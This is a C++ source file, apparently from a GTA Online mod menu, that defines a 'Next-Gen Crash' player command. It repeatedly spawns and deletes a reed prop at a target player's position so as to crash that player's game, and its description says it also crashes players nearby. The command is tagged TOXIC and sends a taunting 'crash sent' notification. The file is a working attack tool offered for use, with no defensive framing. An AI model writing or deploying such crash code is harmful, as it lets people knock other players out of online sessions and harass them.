#include "backend/player_command.hpp"
#include "core/enums.hpp"
#include "core/scr_globals.hpp"
#include "gta_util.hpp"
#include "natives.hpp"
#include "pointers.hpp"
#include "util/world_model.hpp"


namespace big
{
	class next_gen : player_command
	{
		using player_command::player_command;

		virtual CommandAccessLevel get_access_level() override
		{
			return CommandAccessLevel::TOXIC;
		}

		virtual void execute(player_ptr player, const command_arguments& args, const std::shared_ptr<command_context> ctx) override
		{
			// Hash objek yang akan digunakan dalam crash
			Hash reedhash = 1173321732; // proc_sml_reeds_01c

			// Meminta model untuk objek
			STREAMING::REQUEST_MODEL(reedhash);
			while (!STREAMING::HAS_MODEL_LOADED(reedhash))
			{
				script::get_current()->yield(); // Tunggu hingga model selesai dimuatkan
			}

			// Mendapatkan koordinat pemain sasaran
			Vector3 targetCoords =
			    ENTITY::GET_ENTITY_COORDS(PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(g_player_service->get_selected()->id()), false);

			// Mengulang untuk mencipta dan memadamkan objek
			for (int i = 0; i < 100; ++i) // Ulang 100 kali
			{
				// Cipta objek di sekitar pemain sasaran menggunakan fungsi spawn
				Object a2 = big::world_model::spawn(reedhash, targetCoords, true);

				// Tetapkan ciri objek: godmode, kelihatan, dan tiada collision
				if (ENTITY::DOES_ENTITY_EXIST(a2))
				{
					ENTITY::SET_ENTITY_INVINCIBLE(a2, true);        // Godmode
					ENTITY::SET_ENTITY_VISIBLE(a2, true, false);    // Visible
					ENTITY::SET_ENTITY_COLLISION(a2, false, false); // No collision

					// Biarkan objek kekal seketika sebelum dipadamkan
					script::get_current()->yield(500ms);

					// Padamkan objek selepas tempoh yang ditetapkan
					ENTITY::SET_ENTITY_AS_NO_LONGER_NEEDED(&a2);
					ENTITY::DELETE_ENTITY(&a2);

					script::get_current()->yield(300ms);
				}
			}

			// Nyahmuat model selepas selesai digunakan
			STREAMING::SET_MODEL_AS_NO_LONGER_NEEDED(reedhash);

			g_notification_service.push_warning("Crash", "Crash has been sent to targeted player :3");
		}

		virtual void execute(const command_arguments& args, const std::shared_ptr<command_context> ctx = std::make_shared<default_command_context>()) override
		{
			// Jika perlu, urus argumen dan konteks di sini
		}
	};

	next_gen g_next_gen("nextgen", "Next-Gen Crash", "Will also crash other players near the target!\nCommand : nextgen", 0, false);
}